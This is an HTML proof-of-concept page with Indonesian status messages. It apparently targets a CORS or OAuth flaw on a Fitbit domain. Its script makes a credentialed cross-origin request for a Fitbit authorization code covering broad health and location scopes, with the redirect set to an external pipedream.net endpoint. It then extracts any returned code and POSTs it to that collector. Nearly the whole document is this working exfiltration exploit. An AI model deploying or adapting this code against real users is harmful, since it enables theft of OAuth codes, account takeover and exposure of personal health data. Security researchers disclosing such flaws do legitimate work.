<!DOCTYPE html>
<html>
<head>
  <title>Fitbit CORS PoC</title>
</head>
<body>
  <h2>Fitbit OAuth PoC</h2>
  <p id="status">Mencoba fetch dari strava.fitbit.com...</p>
  <p id="result"></p>

  <script>
    const url = 'https://strava.fitbit.com/auth/fitbit?response_type=code&client_id=23QPQJ&redirect_uri=https://eoqb3e0qi0vy2sc.m.pipedream.net&scope=activity heartrate location nutrition profile settings sleep social weight&expires_in=604800';

    fetch(url, {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
      headers: {
        'Origin': window.origin
      }
    })
    .then(res => res.text())
    .then(text => {
      document.getElementById('status').textContent = '✅ Respons diterima dari server!';
      const match = text.match(/code=([\w-]+)/);
      if (match) {
        const code = match[1];
        document.getElementById('result').innerHTML = '✅ OAuth Code ditemukan: <b>' + code + '</b>';

        // Kirim ke Pipedream kamu juga
        fetch('https://eoqb3e0qi0vy2sc.m.pipedream.net', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message: 'OAuth code ditemukan', code: code })
        });
      } else {
        document.getElementById('result').textContent = '⚠️ Tidak menemukan OAuth code dalam respons.';
      }
    })
    .catch(err => {
      document.getElementById('status').textContent = '❌ Gagal fetch!';
      document.getElementById('result').textContent = err;
    });
  </script>
</body>
</html>

